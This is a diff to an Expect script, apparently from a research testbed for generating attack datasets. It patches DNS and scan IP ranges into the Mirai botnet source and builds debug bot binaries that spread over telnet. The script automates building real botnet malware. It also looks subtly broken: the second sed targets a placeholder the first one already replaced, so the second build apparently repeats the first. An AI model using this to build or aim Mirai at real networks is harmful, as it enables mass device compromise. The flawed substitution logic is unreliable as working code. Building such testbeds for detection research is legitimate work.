@@ -9,9 +9,16 @@ set controller_user [lindex $argv 6]
 set controller_pass [lindex $argv 7]
 set controller_path [lindex $argv 8]
 set transfer_pids [lindex $argv 9]
+set dns [lindex $argv 10]
+set ip_o1 [lindex $argv 11]
+set ip_o2 [lindex $argv 12]
+set ip_o3 [lindex $argv 13]
+set ip_o4_1 [lindex $argv 14]
+set ip_o4_2 [lindex $argv 15]
 
 set cnc_config_path "CREME/CREME_backend_execution/scripts/configuration/prepared_files/mirai/cnc"
 set debug_path "Mirai-Source-Code/mirai/debug"
+set mirai_path "Mirai-Source-Code/mirai"
 
 set timeout 120
 
@@ -46,7 +53,30 @@ expect "*:~# "
 send "rm $path/$debug_path/*.txt\r"
 
 # build Mirai-Source-Code
-# ?????????????????????????????????
-
 expect "*:~# "
+send "cd $path/$mirai_path\r"
+
+expect "*$mirai_path# "
+send "sed -i \"s/mirai_dns_xxx/$dns/g\" $path/$mirai_path/bot/resolv.c\r"
+
+expect "*$mirai_path# "
+send "sed -i \"s/mirai_o1_xxx/$ip_o1/g\" $path/$mirai_path/bot/scanner.c\r"
+expect "*$mirai_path# "
+send "sed -i \"s/mirai_o2_xxx/$ip_o2/g\" $path/$mirai_path/bot/scanner.c\r"
+expect "*$mirai_path# "
+send "sed -i \"s/mirai_o3_xxx/$ip_o3/g\" $path/$mirai_path/bot/scanner.c\r"
+
+expect "*$mirai_path# "
+send "sed -i \"s/mirai_o4_xxx/$ip_o4_1/g\" $path/$mirai_path/bot/scanner.c\r"
+expect "*$mirai_path# "
+send "./build.sh debug telnet\r"
+expect "*$mirai_path# "
+send "mv $path/$debug_path/mirai.dbg $path/$debug_path/mirai_scan.dbg \r"
+
+expect "*$mirai_path# "
+send "sed -i \"s/mirai_o4_xxx/$ip_o4_2/g\" $path/$mirai_path/bot/scanner.c\r"
+expect "*$mirai_path# "
+send "./build.sh debug telnet\r"
+
+expect "*$mirai_path# "
 send "exit\r"
